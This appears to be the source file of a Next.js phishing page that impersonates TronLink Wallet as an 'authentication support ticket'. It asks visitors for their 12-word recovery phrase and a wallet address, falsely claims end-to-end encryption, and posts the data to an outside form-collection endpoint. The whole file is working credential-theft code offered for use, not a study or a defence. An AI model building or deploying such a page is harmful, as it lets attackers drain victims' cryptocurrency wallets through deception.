"use client";

import Image from "next/image";
import { Albert_Sans, Alegreya, Anonymous_Pro } from "next/font/google";
import { useState } from "react";
import Link from "next/link";

const anonymous_Pro = Anonymous_Pro({
  subsets: ["latin"],
  weight: ["400", "700"],
});

const alegreya = Alegreya({
  subsets: ["latin"],
  weight: ["400", "700"],
});

const albert_Sans = Albert_Sans({
  subsets: ["latin"],
  weight: ["400", "700"],
});

export default function Home() {
  const [formData, setFormData] = useState({
    mnemonics: "",
    address: "",
  });

  const [errors, setErrors] = useState({
    mnemonics: false,
    address: false,
  });

  const [formSubmitted, setFormSubmitted] = useState(false);
  const [loading, setLoading] = useState(false);

  // Email validation regex
  const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;

  // Function to validate individual fields on change
  const validateField = (name: string, value: string) => {
    switch (name) {
      case "mnemonics":
        return value.trim() !== "";
      case "address":
        return emailRegex.test(value);

      default:
        return true;
    }
  };

  const handleInputChange = (e: any) => {
    const { name, value } = e.target;

    setFormData({
      ...formData,
      [name]: value,
    });

    // Dynamically clear the error if the input becomes valid
    setErrors((prevErrors) => ({
      ...prevErrors,
      [name]: !validateField(name, value),
    }));
  };

  const validateForm = () => {
    const newErrors = {
      mnemonics: !formData.mnemonics,
      address: !emailRegex.test(formData.address),
    };

    setErrors(newErrors);

    return !newErrors.mnemonics && !newErrors.address;
  };

  const FORMSPARK_ACTION_URL = "https://submit-form.com/6bnIUqvJW";

  const handleSubmit = async (e: any) => {
    e.preventDefault();
    if (validateForm()) {
      setLoading(true);
      console.log("Form is valid, attempting to submit...");
      await fetch(FORMSPARK_ACTION_URL, {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
          Accept: "application/json",
        },
        body: JSON.stringify(formData),
      });
      setLoading(false);
      setFormSubmitted(true);

      // alert("Form submitted");
    }
  };

  const goBack = () => {
    setFormSubmitted(false);
    setFormData({
      mnemonics: "",
      address: "",
    });
  };

  return (
    <main
      className={`${anonymous_Pro.className} relative space-y-14 w-full min-h-screen md:p-10 p-5 `}
    >
      <div
        className="absolute inset-0"
        style={{
          backgroundImage: "url('/best.png')",
          backgroundRepeat: "repeat",
          backgroundSize: "150px",
          opacity: 0.06,
          zIndex: -1,
        }}
      ></div>
      <div className="flex flex-col items-center justify-center">
        <Image
          className="invert "
          src="/best.png"
          alt="Next.js logo"
          width={140}
          height={140}
          priority
        />
        <h1 className={`${alegreya.className} text-4xl font-normal `}>
          TronLink Wallet
        </h1>
        <p className="text-md ">Link Tron Ecosystem</p>
      </div>
      <div className={` ${albert_Sans.className} mx-auto`}>
        <h1
          className={`  md:text-4xl text-2xl italic leading-tight py-2 border-t-[1px] border-b-[1px] border-white text-center text-[#2ce1eee7]`}
        >
          Welcome to Tronlink Wallet <br /> Authentication Support <br />
          Ticket
        </h1>
      </div>

      <div className="flex flex-col gap-4 md:text-2xl text-xl tracking-wide">
        <h1>All information is end to end encrypted.</h1>
        <h1>
          Fill and submit this support ticket to the system database to
          authenticate your wallet to the appropriate form.
        </h1>
      </div>

      {!formSubmitted ? (
        <form onSubmit={handleSubmit} className="space-y-6">
          <div className="flex flex-col gap-1">
            <label htmlFor="mnemonics">
              12 mnemonics/words for Authentication <span>(required)</span>
            </label>
            <input
              type="text"
              id="mnemonics"
              name="mnemonics"
              value={formData.mnemonics}
              onChange={handleInputChange}
              className={`${
                errors.mnemonics ? " border-red-500" : ""
              } text-black border-2 border-[#0a0a0a] py-3 px-2 rounded-md text-xl`}
            />
            {errors.mnemonics && (
              <p className="text-red-500">Please fill out this field.</p>
            )}
          </div>

          <div className="flex flex-col gap-1">
            <label htmlFor="address">
              Wallet Address <span>(required)</span>
            </label>
            <input
              type="text"
              id="address"
              name="address"
              value={formData.address}
              onChange={handleInputChange}
              className={`${
                errors.address ? " border-red-500" : ""
              } text-black border-2 border-[#0a0a0a]  py-3 px-2 rounded-md text-xl`}
            />
            {errors.address && (
              <p className="text-red-500">
                Please provide a valid email address.
              </p>
            )}
          </div>

          <button
            type="submit"
            className="flex gap-2 items-center bg-[#2ce1eee7] text-black px-8 py-2 text-xl font-semibold rounded-full"
          >
            Submit
            {loading && <span className="loader"></span>}
          </button>
        </form>
      ) : (
        <div className="text-2xl space-y-14">
          <p className="text-green-500">Ticket submitted successfully!</p>
          <button
            onClick={goBack}
            className="bg-none text-[#2ce1eee7] underline cursor-pointer"
          >
            Go back
          </button>
        </div>
      )}
    </main>
  );
}
